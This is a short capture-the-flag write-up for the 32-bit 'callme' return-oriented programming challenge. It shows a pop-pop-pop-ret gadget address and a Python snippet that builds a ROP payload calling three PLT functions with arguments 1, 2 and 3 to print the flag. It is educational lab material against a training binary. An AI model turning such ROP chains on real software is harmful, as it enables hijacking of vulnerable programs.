# callme - 32bit

This challenge involves consistently calling functions imported via the PLT.


Instructions:
```
You must call `callme_one()`, `callme_two()` and `callme_three()` in that order, each with the arguments 1,2,3 e.g. callme_one(1,2,3) to print the flag.
```
As we need to impersonate a `call` function we need to pop all three arguments off of the stack into registers. We will require gadgets to perform this.

ROPGadget shows us the perfect gadget:
```
0x080488a9 : pop esi ; pop edi ; pop ebp ; ret
```

This will place the parameters in the correct place.

This gives us a structure per call like so:

```python
def call_function(function):

    payload = b""
    payload += function
    payload += pop_gadget
    payload += p32(1)
    payload += p32(2)
    payload += p32(3)
    return payload
```

This will then be repeated for each function. Running this chain produces the flag